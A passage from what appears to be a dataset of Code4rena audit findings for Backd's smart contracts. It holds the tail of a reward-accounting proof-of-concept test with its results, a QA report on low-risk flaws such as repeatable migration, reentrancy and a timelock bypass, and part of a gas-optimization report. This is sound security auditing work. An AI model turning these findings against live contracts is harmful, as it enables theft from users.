CLAIMABLE REWARDS AFTER 5 days\");             console.log(\" \")             for (const user of users) {                 let stepClaimable = await this.ammgauge.claimableRewards(user.address);                 claimableRewards.push(ethers.utils.formatEther(stepClaimable))                  let rewardsClaim = await (await this.ammgauge.claimRewards(user.address)).wait()                 claimedRewards.push(ethers.utils.formatEther(rewardsClaim.logs[0][\"data\"]))             }              console.log(\"Claimable calculated\")             console.log(\"   ALICE - BOB -  CHARLIE - DAVID\")             console.log(claimableRewards)              console.log(\" \")             console.log(\"Effectively Claimed\")             console.log(\"   ALICE - BOB -  CHARLIE - DAVID\")             console.log(claimableRewards)         })  The outputs for both cases are shown on the following chart. The initial staking amount is 10eth amount of the DummyERC20 token.  |         | Without Checkpoints | With Checkpoints | |:-------:|:-------------------:|:----------------:| |  Alice  |         6.6         |       115.5      | |   Bob   |        111.9        |       111.9      | | Charlie |        110.1        |       110.1      | |  David  |        108.9        |       108.9      |   ## Recommended Mitigation Steps - Check how is calculated the staking variables while the pool has no tokens staked and also how the updates and checkpoints are performed.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/109", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Summary  ### Low Risk Issues | |Issue|Instances| |-|:-|:-:| | 1 | `migrate()` still does transfers when the transfer is to the same pool, and this can be done multiple times | 1 | | 2 | Non-exploitable reentrancy | 1 | | 3 | Users can DOS themselves by executing `prepareUnlock(0)` many times | 1 | | 4 | Unused/empty `receive()`/`fallback()` function | 3 | | 5 | `safeApprove()` is deprecated | 4 | | 6 | Missing checks for `address(0x0)` when assigning values to `address` state variables | 8 | | 7 | `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private` | 1 |  Total: 19 instances over 7 issues  ### Non-critical Issues | |Issue|Instances| |-|:-|:-:| | 1 | Unneded import | 1 | | 2 | Return values of `approve()` not checked | 1 | | 3 | Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability | 2 | | 4 | Missing event for critical parameter change | 3 | | 5 | Use a more recent version of solidity | 1 | | 6 | Use a more recent version of solidity | 16 | | 7 | Constant redefined elsewhere | 10 | | 8 | Inconsistent spacing in comments | 3 | | 9 | File is missing NatSpec | 5 | | 10 | NatSpec is incomplete | 17 | | 11 | Event is missing `indexed` fields | 10 | | 12 | Not using the named return variables anywhere in the function is confusing | 2 | | 9 | Typos | 6 |  Total: 80 instances over 13 issues   ## Low Risk Issues  ### 1. `migrate()` still does transfers when the transfer is to the same pool, and this can be done multiple times There's no check that the old address isn't the same as the new address, and there's no check that the migration has already happened  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  52       function migrate(address oldPoolAddress_) public override { 53           ILiquidityPool oldPool_ = ILiquidityPool(oldPoolAddress_); 54           IERC20 lpToken_ = IERC20(oldPool_.getLpToken()); 55           uint256 lpTokenAmount_ = lpToken_.balanceOf(msg.sender); 56           require(lpTokenAmount_ != 0, \"No LP Tokens\"); 57           require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, \"withdrawal fee not 0\"); 58:          lpToken_.safeTransferFrom(msg.sender, address(this), lpTokenAmount_); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L58  ### 2. Non-exploitable reentrancy There is no reentrancy guard in this function, and if used with a token that has transfer callbacks, such as an ERC777, the caller can reenter before `balances` is updated. I don't currently see a way to exploit this  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol   #1  130          uint256 oldBal = IERC20(ammToken).balanceOf(address(this)); 131          IERC20(ammToken).safeTransfer(dst, amount); 132          uint256 newBal = IERC20(ammToken).balanceOf(address(this)); 133          uint256 unstaked = oldBal - newBal; 134          balances[msg.sender] -= unstaked; 135:         totalStaked -= unstaked; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L130-L135  ### 3. Users can DOS themselves by executing `prepareUnlock(0)` many times There's no check on the amount, and every call add another entry to an array. When the user finally calls `executeUnlocks()` they'll run out of gas  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol   #1  118      function prepareUnlock(uint256 amount) external override { 119          require( 120              totalStashed[msg.sender] + amount <= balances[msg.sender], 121              \"Amount exceeds locked balance\" 122:         ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L118-L122  ### 4. Unused/empty `receive()`/`fallback()` function If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`)  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  31:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L31  ```solidity File: protocol/contracts/RewardHandler.sol   #2  30:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L30  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #3  35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ### 5. `safeApprove()` is deprecated [Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead  *There are 4 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  27:               IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L27  ```solidity File: protocol/contracts/RewardHandler.sol   #2  52:           IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L52  ```solidity File: protocol/contracts/RewardHandler.sol   #3  64:           IERC20(token).safeApprove(spender, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L64  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #4  118:          IERC20(token_).safeApprove(spender_, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L118  ### 6. Missing checks for `address(0x0)` when assigning values to `address` state variables  *There are 8 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  72:           token = _token; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L72  ```solidity File: protocol/contracts/BkdLocker.sol  49:           rewardToken = _rewardToken;  74:           rewardToken = newRewardToken; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L49  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  43:           treasury = treasury_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L43  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  39:           ammToken = _ammToken; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L39  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  65:           fundAdmin = fundAdmin_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L65  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  48:           pool = _pool; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L48  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  21:           minter = _minter; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L21  ### 7. `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private` I flagged this in the last Backd contest, but it doesn't seem to have been addressed, so bringing it up again: These functions have the ability to bypass the timelocks of every setting. No contract besides the `Preparable` contract itself should need to call these functions, and having them available will lead to exploits. The contracts that currently call `_setConfig()` in their constructors should be given a new function `_initConfig()` for this purpose. The `Vault` [calls](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L222) some of these functions as well, and should be changed to manually inspect the deadline rather than mucking with the internals, which is error-prone. The mappings should also be made `private`, and there should be public getters to read their values  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/utils/Preparable.sol   #1  115      /** 116       * @notice Execute uint256 config update (with time delay enforced). 117       * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 118       * @return New value. 119       */ 120      function _executeUInt256(bytes32 key) internal returns (uint256) { 121          _executeDeadline(key); 122          uint256 newValue = pendingUInts256[key]; 123          _setConfig(key, newValue); 124          return newValue; 125      } 126   127      /** 128       * @notice Execute address config update (with time delay enforced). 129       * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 130       * @return New value. 131       */ 132      function _executeAddress(bytes32 key) internal returns (address) { 133          _executeDeadline(key); 134          address newValue = pendingAddresses[key]; 135          _setConfig(key, newValue); 136          return newValue; 137:     } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L115-L137  ## Non-critical Issues  ### 1. Unneded import  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/BkdToken.sol   #1  8:   import \"../../libraries/ScaledMath.sol\"; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L8  ### 2. Return values of `approve()` not checked Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  25:           IERC20(rewardToken_).approve(msg.sender, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25  ### 3. Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #1  10:       uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L10  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #2  12:       uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12  ### 4. Missing event for critical parameter change  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #1  58        function setMinter(address _minter) external override onlyGovernance returns (bool) { 59            require(minter == address(0), Error.ADDRESS_ALREADY_SET); 60            require(_minter != address(0), Error.INVALID_MINTER); 61            minter = _minter; 62            return true; 63:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #2  68        function setAdmin(address _admin) external override { 69            require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 70            require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); 71            admin = _admin; 72:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L72  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #3  74        function setFundAdmin(address _fundadmin) external override { 75            require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 76            require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); 77            fundAdmin = _fundadmin; 78:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78  ### 5. Use a more recent version of solidity Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #1  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L2  ### 6. Use a more recent version of solidity Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions  *There are 16 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L2  ```solidity File: protocol/contracts/Controller.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L2  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L2  ```solidity File: protocol/contracts/BkdLocker.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L2  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L2  ```solidity File: protocol/contracts/AddressProvider.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L2  ```solidity File: protocol/contracts/RewardHandler.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L2  ```solidity File: protocol/contracts/tokenomics/Minter.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L2  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L2  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L2  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L2  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L2  ```solidity File: protocol/contracts/access/RoleManager.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L2  ### 7. Constant redefined elsewhere Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.  *There are 10 instances of this issue:* ```solidity File: protocol/contracts/Controller.sol  /// @audit seen in protocol/contracts/StakerVault.sol  21:       IAddressProvider public immutable override addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L21  ```solidity File: protocol/contracts/RewardHandler.sol  /// @audit seen in protocol/contracts/StakerVault.sol  20:       IController public immutable controller;  /// @audit seen in protocol/contracts/Controller.sol  21:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L20  ```solidity File: protocol/contracts/tokenomics/Minter.sol  /// @audit seen in protocol/contracts/RewardHandler.sol  55:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/108", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | 1 | Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate | 5 | | 2 | State variables only set in the constructor should be declared `immutable` | 1 | | 3 | State variables can be packed into fewer storage slots | 2 | | 4 | State variables should be cached in stack variables rather than re-reading them from storage | 32 | | 5 | Multiple accesses of a mapping/array should use a local variable cache | 7 | | 6 | The result of external function calls should be cached rather than re-calling the function | 2 | | 7 | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 14 | | 8 | `internal` functions only called once can be inlined to save gas | 6 | | 9 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` | 1 | | 10 | `<array>.length` should not be looked up in every loop of a `for`-loop | 8 | | 11 | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 1 | | 12 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 1 | | 13 | Using `bool`s for storage incurs overhead | 7 | | 14 | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 7 | | 15 | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 3 | | 16 | Using `private` rather than `public` for constants, saves gas | 11 | | 17 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 7 | | 18 | `require()` or `revert()` statements that check input arguments should be at the top of the function | 3 | | 19 | Empty blocks should be removed or emit something | 3 | | 20 | Use custom errors rather than `revert()`/`require()` strings to save deployment gas | 109 | | 21 | Functions guaranteed to revert when called by normal users can be marked `payable` | 53 |  Total: 283 instances over 21 issues   ## Gas Optimizations  ### 1. Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.  *There are 5 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  50        mapping(address => uint256) public balances; 51        mapping(address => uint256) public actionLockedBalances; 52     53:       mapping(address => mapping(address => uint256)) internal _allowances; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L50-L53  ```solidity File: protocol/contracts/BkdLocker.sol  27        mapping(address => uint256) public balances; 28        mapping(address => uint256) public boostFactors; 29        mapping(address => uint256) public lastUpdated; 30        mapping(address => WithdrawStash[]) public stashedGovTokens; 31:       mapping(address => uint256) public totalStashed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L27-L31  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  27        mapping(address => uint256) public perUserStakedIntegral; 28:       mapping(address => uint256) public perUserShare; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L27-L28  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  44        mapping(address => uint256) public initialLocked; 45        mapping(address => uint256) public totalClaimed; 46:       mapping(address => address) public holdingContract; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L44-L46  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  25        mapping(address => uint256) public perUserStakedIntegral; 26:       mapping(address => uint256) public perUserShare; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L25-L26  ### 2. State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces each Gwarmacces (**100 gas**) with a `PUSH32` (**3 gas**).  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  39:       uint256 public totalTime; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L39  ### 3. State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  /// @audit Variable ordering with 8 slots instead of the current 9: /// @audit  uint256(32):totalTime, uint256(32):initialLockedSupply, uint256(32):unallocatedSupply, mapping(32):initialLocked, mapping(32):totalClaimed, mapping(32):holdingContract, address(20):admin, bool(1):initializedSupply, address(20):fundAdmin 34:       address public admin; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L34  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol   #2  /// @audit Variable ordering with 5 slots instead of the current 6: /// @audit  mapping(32):keeperRecords, mapping(32):perPeriodTotalFees, uint256(32):epoch, mapping(32):perPeriodTotalInflation, uint48(6):lastUpdated, bool(1):killed 27:       mapping(address => KeeperRecord) public keeperRecords; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L27  ### 4. State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 32 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  /// @audit token 330:          uint256 oldBal = IERC20(token).balanceOf(address(this));  /// @audit token 333:              ILiquidityPool pool = addressProvider.getPoolForToken(token);  /// @audit token 337:          IERC20(token).safeTransferFrom(msg.sender, address(this), amount);  /// @audit token 338:          uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal;  /// @audit token 375:          uint256 oldBal = IERC20(token).balanceOf(address(this));  /// @audit token 381:          IERC20(token).safeTransfer(dst, amount);  /// @audit token 383:          uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L330  ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit totalLockedBoosted 97:           curRewardTokenData.feeIntegral += amount.scaledDiv(totalLockedBoosted); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L97  ```solidity File: protocol/contracts/tokenomics/Minter.sol  /// @audit currentInflationAmountLp 91:               currentInflationAmountLp +  /// @audit currentInflationAmountLp 208:                  currentInflationAmountLp +  /// @audit currentInflationAmountKeeper 92:               currentInflationAmountKeeper +  /// @audit currentInflationAmountKeeper 209:                  currentInflationAmountKeeper +  /// @audit currentInflationAmountAmm 93:               currentInflationAmountAmm;  /// @audit currentInflationAmountAmm 210:                  currentInflationAmountAmm;  /// @audit totalAvailableToNow 220:          require(newTotalMintedToNow <= totalAvailableToNow, \"Mintable amount exceeded\"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L91  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit minter 501:          uint256 lpInflationRate = Minter(minter).getLpInflationRate();  /// @audit minter 511:          uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();  /// @audit minter 526:          uint256 ammInflationRate = Minter(minter).getAmmInflationRate();  /// @audit totalKeeperPoolWeight 517:              totalKeeperPoolWeight;  /// @audit totalKeeperPoolWeight 575:          totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  /// @audit totalLpPoolWeight 502:          uint256 poolInflationRate = (currentUInts256[key] * lpInflationRate) / totalLpPoolWeight;  /// @audit totalLpPoolWeight 589:          totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  /// @audit totalAmmTokenWeight 528:              totalAmmTokenWeight;  /// @audit totalAmmTokenWeight 602:          totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L501  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  /// @audit ammStakedIntegral 159:          perUserStakedIntegral[user] = ammStakedIntegral;  /// @audit totalStaked 90:                   (block.timestamp - uint256(ammLastUpdated))).scaledDiv(totalStaked);  /// @audit totalStaked 148:              ammStakedIntegral += (currentRate * timeElapsed).scaledDiv(totalStaked); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L159  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  /// @audit unallocatedSupply 84:           require(unallocatedSupply > 0, \"No reward tokens in contract\"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit epoch 87:           keeperRecords[beneficiary].feesInPeriod[epoch] += amount;  /// @audit epoch 88:           perPeriodTotalFees[epoch] += amount;  /// @audit epoch 131:              endEpoch = epoch; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L87  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit _roles[role].members 148:          return _roles[role].members[account]; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L148  ### 5. Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory  *There are 7 instances of this issue:* ```solidity File: 